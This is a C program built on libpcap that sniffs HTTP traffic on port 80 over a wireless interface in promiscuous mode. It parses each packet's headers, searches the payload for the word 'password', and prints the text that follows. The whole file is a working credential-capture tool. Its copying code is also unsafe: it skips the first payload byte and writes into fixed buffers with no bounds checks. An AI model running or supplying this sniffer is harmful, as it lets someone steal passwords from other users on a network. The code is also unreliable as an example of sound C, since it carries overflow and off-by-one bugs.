#include <stdio.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>

#include <string.h>

/* For information on what filters are available
   use the man page for pcap-filter
   $ man pcap-filter
*/

void my_packet_handler(
    u_char *args,
    const struct pcap_pkthdr *header,
    const u_char *packet
);

int main(int argc, char **argv) {
    char dev[] = "wlan0";
    pcap_t *handle;
    char error_buffer[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;
    char filter_exp[] = "tcp port 80";
    bpf_u_int32 subnet_mask, ip;

    if (pcap_lookupnet(dev, &ip, &subnet_mask, error_buffer) == -1) {
        printf("Could not get information for device: %s\n", dev);
        ip = 0;
        subnet_mask = 0;
    }
    handle = pcap_open_live(dev, BUFSIZ, 1, 10000, error_buffer);
    if (handle == NULL) {
        printf("Could not open %s - %s\n", dev, error_buffer);
        return 2;
    }
    if (pcap_compile(handle, &filter, filter_exp, 0, ip) == -1) {
        printf("Bad filter - %s\n", pcap_geterr(handle));
        return 2;
    }
    if (pcap_setfilter(handle, &filter) == -1) {
        printf("Error setting filter - %s\n", pcap_geterr(handle));
        return 2;
    }

    /* pcap_next() or pcap_loop() to get packets from device now */

    pcap_loop(handle, 0, my_packet_handler, NULL);

    /* Only packets over port 80 will be returned. */
    
    return 0;
}

void my_packet_handler(
    u_char *args,
    const struct pcap_pkthdr *header,
    const u_char *packet
)
{
    /* First, lets make sure we have an IP packet */
    struct ether_header *eth_header;
    eth_header = (struct ether_header *) packet;
    if (ntohs(eth_header->ether_type) != ETHERTYPE_IP) {
        printf("Not an IP packet. Skipping...\n\n");
        return;
    }

    /* The total packet length, including all headers
       and the data payload is stored in
       header->len and header->caplen. Caplen is
       the amount actually available, and len is the
       total packet length even if it is larger
       than what we currently have captured. If the snapshot
       length set with pcap_open_live() is too small, you may
       not have the whole packet. */
    
    
    // printf("Total packet available: %d bytes\n", header->caplen);
    // printf("Expected packet size: %d bytes\n", header->len);

    /* Pointers to start point of various headers */
    const u_char *ip_header;
    const u_char *tcp_header;
    const u_char *payload;

    /* Header lengths in bytes */
    int ethernet_header_length = 14; /* Doesn't change */
    int ip_header_length;
    int tcp_header_length;
    int payload_length;

    /* Find start of IP header */
    ip_header = packet + ethernet_header_length;
    /* The second-half of the first byte in ip_header
       contains the IP header length (IHL). */
    ip_header_length = ((*ip_header) & 0x0F);
    /* The IHL is number of 32-bit segments. Multiply
       by four to get a byte count for pointer arithmetic */
    ip_header_length = ip_header_length * 4;
    
    //printf("IP header length (IHL) in bytes: %d\n", ip_header_length);

    /* Now that we know where the IP header is, we can 
       inspect the IP header for a protocol number to 
       make sure it is TCP before going any further. 
       Protocol is always the 10th byte of the IP header */
    u_char protocol = *(ip_header + 9);
    if (protocol != IPPROTO_TCP) {
        printf("Not a TCP packet. Skipping...\n\n");
        return;
    }

    /* Add the ethernet and ip header length to the start of the packet
       to find the beginning of the TCP header */
   
    tcp_header = packet + ethernet_header_length + ip_header_length;
    
    /* TCP header length is stored in the first half 
       of the 12th byte in the TCP header. Because we only want
       the value of the top half of the byte, we have to shift it
       down to the bottom half otherwise it is using the most 
       significant bits instead of the least significant bits */
    
    tcp_header_length = ((*(tcp_header + 12)) & 0xF0) >> 4;
    
    /* The TCP header length stored in those 4 bits represents
       how many 32-bit words there are in the header, just like
       the IP header length. We multiply by four again to get a
       byte count. */
    
    tcp_header_length = tcp_header_length * 4;
    
    //printf("TCP header length in bytes: %d\n", tcp_header_length);

    /* Add up all the header sizes to find the payload offset */
    int total_headers_size = ethernet_header_length+ip_header_length+tcp_header_length;
    
    // printf("Size of all headers combined: %d bytes\n", total_headers_size);
    
    payload_length = header->caplen -
        (ethernet_header_length + ip_header_length + tcp_header_length);
    
    // printf("Payload size: %d bytes\n", payload_length);
    
    payload = packet + total_headers_size;
    
    // printf("Memory address where payload begins: %p\n\n", payload);
    
   /*
   if(payload_length > 0)
   {
    	printf("IP header length (IHL) in bytes: %d\n", ip_header_length);
    	printf("TCP header length in bytes: %d\n", tcp_header_length);
    	printf("Size of all headers combined: %d bytes\n", total_headers_size);
    	printf("Payload size: %d bytes\n", payload_length);
    	printf("Memory address where payload begins: %p\n\n", payload);
   }

   */


    

    /* Print payload in ASCII */

   char info[14000] = ""; 
     if (payload_length > 0) 
     {
        const u_char *temp_pointer = payload;
        int byte_count = 0;
	int str_len = 0;
        while (byte_count++ < payload_length)
	{
            // printf("%c", *temp_pointer);
	    //sprintf( info, "%c", *temp_pointer );
            temp_pointer++;
            info[str_len++] = (char)(*temp_pointer);
	    // printf( "infofo : %s\n", info ); 
        }
        info[str_len++] = '\0';
        // printf("\n");
	// printf( " info : %s \n", info );

	char *passw = strstr( info, "password" );

	if( passw != NULL )
	{
	    // printf( "\n\ninfo contains password...\n\n" );
	    char *pss = passw + 9;
	    char phrase[140] = "";
	    int passlen = 0;
	    while( (char)(*pss) != ')' && (char)(*pss) != ' ' )
	    {
	    	phrase[passlen++] = (char)(*pss);
	    	pss++;
	    }

	    phrase[passlen] = '\0';

	    printf( "Password is : %s\n", phrase );

	}

	else
	{
	    // printf( "\n\nno passwords.\n\n" );
	}

	strcpy( info, " " );
     }

    return;
}
